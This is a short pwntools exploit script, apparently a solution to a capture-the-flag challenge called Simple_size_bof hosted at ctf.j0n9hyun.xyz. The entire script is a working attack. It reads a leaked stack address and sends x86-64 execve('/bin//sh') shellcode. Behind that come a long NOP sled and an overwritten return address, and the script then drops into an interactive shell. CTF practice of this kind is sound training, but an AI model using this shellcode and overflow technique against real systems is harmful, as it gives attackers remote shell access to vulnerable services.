from pwn import *

#p=process("./Simple_size_bof")
p=remote("ctf.j0n9hyun.xyz", 3005)

p.recvuntil("buf: 0x")
buf_addr=int(p.recv(12),16)

payload="\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05" # 31bit
payload+='\x90'*0x6d19
payload+=p64(buf_addr)

p.sendline(payload)
p.interactive()

